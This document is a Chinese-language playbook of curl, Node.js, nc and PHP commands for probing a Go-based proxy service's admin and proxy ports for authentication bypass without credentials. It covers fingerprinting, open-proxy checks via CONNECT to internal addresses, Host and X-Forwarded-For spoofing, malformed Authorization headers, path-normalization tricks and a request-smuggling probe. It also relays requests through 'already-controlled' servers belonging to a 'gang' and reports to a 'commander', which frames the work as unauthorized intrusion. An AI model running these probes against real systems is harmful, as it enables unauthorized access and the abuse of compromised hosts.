# 目的：对 Go 自研代理类服务（管理口 + 代理口）做"不需凭据即可判定"的探测与穷尽绕过核查
# 适用：任意 host:port（示例 203.0.113.68:18080 管理口 / :3333 :6667 代理口）
# 红线：全程直连，unset 全部 *_proxy 且加 --noproxy '*'，避免脏代理产生假回显

## 0. 指纹识别（10 秒判定是否 Go 实现 + 是否同一套程序）
curl -s -m 20 -i --noproxy '*' "http://TARGET:18080/"
# Go 特征铁证三件套：
#   Content-Type: text/plain; charset=utf-8
#   X-Content-Type-Options: nosniff
#   Content-Length: 24  body: authentication required      ← http.Error() 输出
curl -s -m 20 -i --noproxy '*' "http://TARGET:3333/"
#   HTTP/1.1 407 Proxy Authentication Required
#   Proxy-Authenticate: Basic realm="session-proxy"
#   body: proxy authentication required
# 另有：GET //  →  301 <a href="/">Moved Permanently</a>.   ← http.ServeMux cleanPath
#       无 Host 头 → 400 Bad Request: missing required Host header  ← Go >= 1.20

## 1. 判定 401 是"路由前全局中间件"还是"单 handler 检查"
for p in / /api /admin /status /health /metrics /notexist-xyz-123; do
  printf "%-26s %s\n" "$p" "$(curl -s -m 12 -o /dev/null -w '%{http_code}' "http://TARGET:18080$p")"
done
# 关键：**连不存在路径也返回同一个 401 + 相同 Content-Length** → 全局 catch-all，路径枚举无意义

## 2. open proxy 检测（必须用原始 socket，curl 的 -x 会被 no_proxy 干扰）
node -e '
const net=require("net");
const t=[["GET abs-URI",`GET http://target81.example.com/ip HTTP/1.1\r\nHost: target81.example.com\r\nConnection: close\r\n\r\n`],
         ["CONNECT ext",`CONNECT target81.example.com:443 HTTP/1.1\r\nHost: target81.example.com:443\r\n\r\n`],
         ["CONNECT 127.0.0.1",`CONNECT 127.0.0.1:80 HTTP/1.1\r\nHost: 127.0.0.1:80\r\n\r\n`],
         ["CONNECT 10.0.0.1",`CONNECT 10.0.0.1:80 HTTP/1.1\r\nHost: 10.0.0.1:80\r\n\r\n`],
         ["OPTIONS *",`OPTIONS * HTTP/1.1\r\nHost: x\r\n\r\n`]];
(async()=>{for(const [n,p] of t){await new Promise(r=>{const s=net.connect(3333,"TARGET");
 s.on("connect",()=>s.write(p));let b="";s.on("data",d=>{b+=d;if(/\r\n\r\n/.test(b)){console.log(n.padEnd(20),b.split("\r\n")[0]);s.destroy();r();}});
 s.on("close",()=>{if(!b){console.log(n.padEnd(20),"(no response)");r();}});s.on("error",e=>{console.log(n.padEnd(20),e.code);r();});});}} )();'
# 判定：任何请求（含 CONNECT 内网地址）都回 407 → 不是 open proxy，无内网豁免

## 3. 无凭据绕过清单（逐条跑，全部 401/407 即判定"认证硬性，需凭据"）
# 3.1 Host 头虚拟主机路由豁免
for h in 127.0.0.1 localhost 127.0.0.1:18080 session-proxy-admin internal; do
  echo "$h -> $(curl -s -m 12 -o /dev/null -w '%{http_code}' -H "Host: $h" http://TARGET:18080/)"; done
# 3.2 来源伪造
for h in "X-Forwarded-For: 127.0.0.1" "X-Real-IP: 127.0.0.1" "CF-Connecting-IP: 127.0.0.1"; do
  echo "$h -> $(curl -s -m 12 -o /dev/null -w '%{http_code}' -H "$h" http://TARGET:18080/)"; done
# 3.3 方法切换
for m in OPTIONS HEAD TRACE PUT DELETE; do
  echo "$m -> $(curl -s -m 12 -o /dev/null -w '%{http_code}' -X $m http://TARGET:18080/)"; done
# 3.4 畸形 Authorization（空口令 / 无空格 / 超长 / 非补位 base64 / 多值 / 头名大小写）
for a in "Basic Og==" "Basic YWRtaW46" "Basic" "Basic " "Basic !!!!" "Basic $(printf 'A%.0s' {1..500})" "Basic YWRtaW4"; do
  echo "[${a:0:24}] -> $(curl -s -m 12 -o /dev/null -w '%{http_code}' -H "Authorization: $a" http://TARGET:18080/)"; done
# 3.5 路径绕过（Go cleanPath 会把 // /a/../b 归一化并 301，属正常行为不算绕过）
for p in "//" "////" "/./" "/%2e/" "/admin/..;/" "/..;/" "/;/" "/.:/" "/%2f"; do
  echo "$p -> $(curl -s -m 12 -o /dev/null -w '%{http_code}' "http://TARGET:18080$p")"; done
# 3.6 协议层
curl -s -m 12 -i --http1.0 http://TARGET:18080/ | head -3      # HTTP/1.0
curl -s -m 12 -o /dev/null -w "%{http_code}\n" -H "Authorization: Basic Og==" -H "Authorization: Basic YWRtaW46" http://TARGET:18080/   # 多值
curl -s -m 12 -o /dev/null -w "%{http_code}\n" -H "Proxy-Authorization: Basic Og==" http://TARGET:18080/   # 头名混用
# 请求走私探测
printf 'POST / HTTP/1.1\r\nHost: TARGET:18080\r\nContent-Length: 0\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n' | nc TARGET 18080

## 4. 交叉验证"是否存在源 IP 白名单豁免"
# 从团伙/内网的另一台已控服务器发起同样请求（PHP: curl_exec 或 fsockopen + fwrite）
# 若响应与外部发起完全一致 → 无源 IP 信任豁免，认证与来源无关，别再浪费轮次
php -r '$c=curl_init("http://TARGET:18080/");curl_setopt($c,CURLOPT_RETURNTRANSFER,1);curl_setopt($c,CURLOPT_HEADER,1);curl_setopt($c,CURLOPT_TIMEOUT,10);echo curl_exec($c);'

## 结论模板
# 管理口 401 + 代理口 407、任意路径/头/方法/协议畸形均同响应、非 open proxy、无源 IP 豁免
# → 该服务认证实现严谨，唯一路径是拿到 Basic 凭据（禁爆破场景下应记"需凭据"交回指挥者）